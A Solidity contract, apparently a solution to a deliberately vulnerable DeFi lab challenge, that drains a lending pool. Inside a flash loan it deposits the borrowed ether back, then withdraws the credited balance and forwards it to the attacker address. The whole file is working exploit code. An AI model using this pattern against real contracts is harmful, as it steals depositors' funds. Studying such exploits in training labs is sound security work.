
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256) external;
}

contract FlashLoanEtherReceiver {
    ISideEntranceLenderPool public pool;
    address public attacker;

    constructor(address poolAddr) {
      pool = ISideEntranceLenderPool(poolAddr);
      attacker = msg.sender;
    }

    function drainPool(uint256 _amount) external {
        console.log("contract addr", address(this));
        pool.flashLoan(_amount);
    }

    function execute() external payable {
        console.log("receiver balance", address(this).balance);
        console.log("msg.value", msg.value);
        // Right after getting the flashLoan, deposit back into the pool
        // in order to restitute the initial balance.
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        require(msg.sender == attacker, "Unauthorized");
        pool.withdraw();
    }

    fallback() external payable {
        console.log("Received ETH", msg.value);
        (bool sent, bytes memory data) = payable(attacker).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}